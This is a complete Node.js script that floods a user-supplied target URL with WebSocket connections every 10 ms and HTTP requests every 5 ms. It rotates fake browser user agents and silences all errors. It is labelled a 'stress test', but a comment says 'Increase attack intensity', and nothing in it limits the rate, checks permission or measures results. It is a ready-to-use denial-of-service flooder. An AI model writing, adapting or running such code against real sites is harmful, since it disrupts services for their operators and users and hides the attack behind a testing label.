const WebSocket = require('ws');
const http = require('http');
const https = require('https');
const url = require('url');

// Check if target URL is provided
if (process.argv.length < 3) {
    console.log('Usage: node script.js <target_url>');
    process.exit(1);
}

const target = process.argv[2];
const parsedUrl = url.parse(target);
const isSecure = parsedUrl.protocol === 'https:';
const host = parsedUrl.host;
const path = parsedUrl.path || '/';

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1'
];

function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function createWebSocketConnection() {
    try {
        const wsUrl = `wss://${host}${path}`;
        const ws = new WebSocket(wsUrl, {
            headers: {
                'User-Agent': getRandomUserAgent()
            }
        });

        ws.on('open', function open() {
            setInterval(() => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send('GET / HTTP/1.1\\r\\nHost: ' + host + '\\r\\n\\r\\n');
                }
            }, 100);
        });

        ws.on('error', function error(err) {
            // Suppress error output to avoid clutter
        });
    } catch (e) {
        // Suppress connection errors
    }
}

function sendHttpRequest() {
    try {
        const options = {
            hostname: host,
            port: isSecure ? 443 : 80,
            path: path,
            method: 'GET',
            headers: {
                'User-Agent': getRandomUserAgent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0'
            }
        };

        const protocol = isSecure ? https : http;

        const req = protocol.request(options, (res) => {
            res.on('data', () => {});
            res.on('end', () => {});
        });

        req.on('error', (e) => {
            // Suppress request errors
        });
        req.end();
    } catch (e) {
        // Suppress any other errors
    }
}

console.log('Starting stress test on: ' + target);
// Increase attack intensity
setInterval(createWebSocketConnection, 10);
setInterval(sendHttpRequest, 5);
